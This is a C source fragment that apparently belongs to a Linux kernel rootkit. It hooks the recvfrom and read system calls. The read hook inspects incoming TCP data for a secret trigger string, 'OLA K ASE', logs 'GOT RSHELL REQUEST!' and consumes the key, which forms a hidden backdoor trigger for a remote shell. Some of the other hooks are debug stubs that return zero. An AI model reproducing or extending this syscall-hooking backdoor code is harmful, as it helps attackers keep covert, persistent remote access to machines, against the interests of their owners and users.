asmlinkage int my_recvfrom64(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
	int ret = 0;

	//SYSCALL64(__NR_write, 1, "hello from hook!\n", 17, 0, 0, 0);
	//ret = SYSCALL64(__NR_recvfrom, fd, ubuf, size, flags, addr, addr_len);
	return ret;
}

asmlinkage int my_recvfrom32(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
    int ret = 0;

    SYSCALL64(__NR_write, 1, "hello from hook!\n", 17, 0, 0, 0);
    //ret = SYSCALL32(__NR_recvfrom, fd, ubuf, size, flags, addr, addr_len);
    return ret;
}

#define RSHELL_KEY "OLA K ASE\n"

asmlinkage int my_read64(int fd, void *buf, size_t len) {
	int ret = 0, err = 0;
	struct socket *sock = NULL;
	struct sk_buff *sk_buff = NULL;
	char my_buf[sizeof(RSHELL_KEY)];
	struct file *file = NULL;
	bool is_socket = false;

	file = f_fget(fd);
	if (file) {
		sock = f_sock_from_file(file, &err);
		if (sock && sock->type == SOCK_STREAM && (sk_buff = skb_peek(&sock->sk->sk_receive_queue))) {
			if (sizeof(RSHELL_KEY) - 1 == sk_buff->len && f_strncmp(RSHELL_KEY, sk_buff->data, sk_buff->len) == 0) {
				f_printk("GOT RSHELL REQUEST!\n");
				f_fput(file);
				ret = KSYSCALL(__NR_read, fd, my_buf, sizeof(my_buf) - 1, 0, 0, 0);
				return my_read64(fd, buf, len);
			}
		}
		f_fput(file);
	}
	return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
}

asmlinkage int my_read32(int fd, void *buf, size_t len) {
	return 0;
}
